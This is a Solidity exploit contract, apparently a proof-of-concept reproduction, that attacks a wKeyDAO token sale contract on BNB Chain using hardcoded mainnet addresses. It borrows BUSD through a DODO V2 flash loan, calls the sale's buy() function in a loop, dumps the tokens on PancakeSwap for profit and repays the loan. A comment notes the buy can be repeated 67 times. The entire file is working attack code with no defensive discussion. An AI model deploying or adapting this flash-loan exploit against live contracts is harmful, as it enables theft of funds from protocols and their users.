// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import { ERC721 } from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import { console2 } from "@dev/forge-std/console2.sol";
import { IPancakeRouter02 } from "@contracts/Interface/Pancake/IPancakeRouter.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Contracts involved
address constant wKeyDaoSell = 0xD511096a73292A7419a94354d4C1C73e8a3CD851;
address constant BUSD = 0x55d398326f99059fF775485246999027B3197955;
address constant wKeyDAO = 0x194B302a4b0a79795Fb68E2ADf1B8c9eC5ff8d1F;
address constant pancakeSwapRouterV2 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

contract Attacker {
    function fire() external {
        __dodoFlashLoan(address(0x107F3Be24e3761A91322AA4f5F54D9f18981530C), 1200e18, BUSD);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function __dodoFlashLoan(
        address flashLoanPool, //You will make a flashloan from this DODOV2 pool
        uint256 loanAmount,
        address loanToken
    )
        internal
    {
        bytes memory data = abi.encode(flashLoanPool, loanToken, loanAmount);
        address flashLoanBase = IDODO(flashLoanPool)._BASE_TOKEN_();
        console2.log("flashLoanBase Balance:", flashLoanBase);

        if (flashLoanBase == loanToken) {
            IDODO(flashLoanPool).flashLoan(loanAmount, 0, address(this), data);
        } else {
            IDODO(flashLoanPool).flashLoan(0, loanAmount, address(this), data);
        }
    }

    //Note: CallBack function executed by DODOV2(DVM) flashLoan pool
    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        _flashLoanCallBack(sender, baseAmount, quoteAmount, data);
    }

    function _flashLoanCallBack(address sender, uint256, uint256, bytes calldata data) internal {
        (address flashLoanPool, address loanToken, uint256 loanAmount) = abi.decode(data, (address, address, uint256));

        require(sender == address(this) && msg.sender == flashLoanPool, "HANDLE_FLASH_NENIED");

        __realAttack();

        //Return funds
        IERC20(loanToken).transfer(flashLoanPool, loanAmount);
    }

    function __realAttack() internal {
        //approve BUSD to wKeyDaoSell
        IERC20(BUSD).approve(wKeyDaoSell, 1_000_000e18);

        //approve wKeyDAO to pancakeSwapRouterV2
        IERC20(wKeyDAO).approve(pancakeSwapRouterV2, 10_000_000_000_000_000_000_000_000_000_000);

        // to save time, we loop 5 times. -- can buy 67 times in total
        for (uint256 i = 0; i < 5; i++) {
            //buy
            IwKeyDaoSell(wKeyDaoSell).buy();

            //sell wKeyDAO
            address[] memory path = new address[](2);
            path[0] = address(wKeyDAO);
            path[1] = address(BUSD);
            IPancakeRouter02(pancakeSwapRouterV2).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(wKeyDAO).balanceOf(address(this)), 0, path, address(this), block.timestamp
            );
        }
    }
}

interface IwKeyDaoSell {
    function buy() external;
}

interface IDODO {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;

    function _BASE_TOKEN_() external view returns (address);
    function _BASE_RESERVE_() external view returns (uint112);
    function _QUOTE_TOKEN_() external view returns (address);
    function _QUOTE_RESERVE_() external view returns (uint112);
}
